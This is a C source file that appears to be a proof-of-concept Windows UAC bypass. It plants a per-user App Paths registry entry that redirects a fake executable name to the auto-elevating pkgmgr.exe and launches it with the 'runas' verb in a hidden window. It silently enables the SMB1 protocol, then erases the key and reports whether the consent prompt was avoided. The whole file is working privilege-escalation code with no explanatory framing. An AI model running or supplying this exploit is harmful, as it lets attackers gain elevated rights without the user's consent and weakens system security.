#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

// Replace path with a already elevated bin
#define APPPATHS L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\dummy_bypass.exe"
#define TARGET   L"C:\\Windows\\System32\\pkgmgr.exe"
#define PAYLOAD  L"/iu:SMB1Protocol"

static BOOL is_elevated(void) {
    HANDLE tok = NULL;
    TOKEN_ELEVATION e = {0};
    DWORD sz = sizeof(e);
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        GetTokenInformation(tok, TokenElevation, &e, sizeof(e), &sz);
        CloseHandle(tok);
    }
    return e.TokenIsElevated;
}

static BOOL consent_running(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, L"consent.exe")) {
                found = TRUE;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

int main(void) {
    if (is_elevated()) {
        printf("Already elevated\n");
        return 1;
    }

    HKEY hk;
    DWORD disp;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, APPPATHS, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_ALL_ACCESS, NULL, &hk, &disp) != ERROR_SUCCESS) {
        printf("RegCreate failed\n");
        return 1;
    }

    RegSetValueExW(hk, NULL, 0, REG_SZ, (BYTE*)TARGET, (DWORD)((wcslen(TARGET) + 1) * 2));
    RegCloseKey(hk);

    BOOL uac_seen = consent_running();

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    sei.lpVerb = L"runas";
    sei.lpFile = L"dummy_bypass.exe";
    sei.lpParameters = PAYLOAD;
    sei.nShow = SW_HIDE;

    BOOL ok = ShellExecuteExW(&sei);

    RegDeleteKeyW(HKEY_CURRENT_USER, APPPATHS);

    if (!ok) {
        printf("ShellExecute failed\n");
        return 1;
    }

    HANDLE hProc = sei.hProcess;
    DWORD ec = (DWORD)-1;
    DWORD deadline = GetTickCount() + 120000;

    while (GetTickCount() < deadline) {
        if (!uac_seen && consent_running()) uac_seen = TRUE;
        if (WaitForSingleObject(hProc, 500) == WAIT_OBJECT_0) {
            GetExitCodeProcess(hProc, &ec);
            break;
        }
    }
    CloseHandle(hProc);

    printf("UAC: %s\n", uac_seen ? "YES" : "NO");
    printf("Exit: 0x%08lx\n", ec);
    printf("%s\n", !uac_seen ? "BYPASS OK" : "BYPASS FAILED");

    return 0;
}